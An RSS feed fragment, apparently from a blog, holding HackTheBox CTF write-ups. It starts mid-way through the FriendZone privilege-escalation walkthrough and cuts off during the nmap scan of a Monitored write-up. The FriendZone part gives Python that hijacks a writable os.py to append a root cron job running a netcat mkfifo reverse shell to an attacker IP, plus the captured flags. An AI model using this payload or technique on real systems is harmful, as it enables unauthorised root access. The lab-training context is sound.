&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;friend&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,111&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,112&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
friend@FriendZone:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
627c48e56e0344b5b54fcd021f9bc8aa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;

&lt;p&gt;Using LinPEAS, I was able to enumerate the machine and find group writable files. These are the ones that are most interesting to me:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╔══════════╣ Interesting writable files owned by me or writable by everyone &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Home&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;max 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                      
/dev/mqueue                                                                                                                            
/dev/shm
/etc/Development
/etc/Development/creds.txt
/etc/Development/hacked.php
/etc/Development/rev-shell.php
/etc/Development/test.php
/etc/sambafiles
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/var/lib/php/sessions
/var/mail/friend
/var/spool/samba
/var/tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, since we are supposed to exploit crontabs, we need ways to execute such files and set up a cronjob to spawn a root shell. For that to work, we would need a file that is being ran as root that was possibly world writable. However, none of these above are being run by root. I’ve then uploaded PSPY to the machine and found these interesting lines:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;13     | 
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12     | 
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;115    | 
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11     | 
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10     | 
2024/01/18 23:26:59 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1      | /sbin/init splash 
2024/01/18 23:28:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;23018  | 
2024/01/18 23:28:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;23017  | /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /opt/server_admin/reporter.py 
2024/01/18 23:28:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;23016  | /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is a process being ran as root, which is related to this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reporter.py&lt;/code&gt; file. Let’s take a look at it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/server_admin/reporter.py 
&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

import os

to_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin1@friendzone.com&quot;&lt;/span&gt;
from_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin2@friendzone.com&quot;&lt;/span&gt;

print &lt;span class=&quot;s2&quot;&gt;&quot;[+] Trying to send email to %s&quot;&lt;/span&gt;%to_address

&lt;span class=&quot;c&quot;&gt;#command = &apos;&apos;&apos; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&apos;&apos;&apos;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#os.system(command)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# I need to edit the script later&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Sam ~ python developer&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I immediately notice that this script imports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt;, which appeared in LinPEAS as a group writable file. If this is the case, and reporter.py imports os, we can write a line there to automatically add a cronjob to spawn a reverse shell.&lt;/p&gt;

&lt;h2 id=&quot;-step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Step 4 - Privilege escalation&lt;/h2&gt;

&lt;p&gt;We can write these lines into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.py&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;your-ip&amp;gt; 4444 &amp;gt;/tmp/f
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&apos;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/etc/crontab&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Substituting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;your-ip&amp;gt;&lt;/code&gt; by the IP of your local machine. We can see that the cronjob was successfully added:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;c&quot;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Unlike any other crontab you don&apos;t have to run the `crontab&apos;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# command to install the new version when you edit this file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# that none of the other crontabs do.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;span class=&quot;c&quot;&gt;# m h dom mon dow user  command&lt;/span&gt;
17 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.hourly
25 6    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.daily &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
47 6    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 7   root    &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.weekly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
52 6    1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.monthly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4444 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we start our netcat on port 4444 and wait… After a while, we get the root shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4444
Connection from 10.129.35.203:34736
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;&apos;t access tty; job control turned off
# whoami
root
# cat /root/root.txt
132c1657472872848c0de6549a1d2a97
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a bit more about zone transfers and cronjobs. I really enjoyed the process to get the user shell, but the system was quite boring. Every time I have to dabble with cronjobs, I become very unenthusiastic and somewhat disinterested. Cronjob-related tasks often boil down to waiting for the right moment or repeatedly checking log files, which doesn’t quite give the same thrill as more interactive and dynamic aspects of system penetration and exploration.&lt;/p&gt;

&lt;p&gt;Nevertheless, I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 18 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//friendzone-htb</link>
        <link href="http://localhost:4000/friendzone-htb"/>
        <guid isPermaLink="true">http://localhost:4000/friendzone-htb</guid>
      </item>
    
      <item>
        <title>Monitored - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;In today’s post, we will be solving Season’s 4 second machine, Monitored. This is a medium difficulty machine full of rabbit
holes, so we need to pay attention to its environment in order to solve it. Let’s jump right into it!&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;System enumeration&lt;/li&gt;
  &lt;li&gt;Privilege escalation&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;We start by enumerating the system’s ports in order to get a feeling of what is running:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap 10.129.37.231
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.37.231
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65530 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nagios.monitored.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Monitored/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Dorset/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
TCP/IP fingerprint:
OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/15%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30330%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65A56AA
OS:8%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ
OS:&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;O1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11
OS:NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE8
OS:8%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53
OS:CNNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
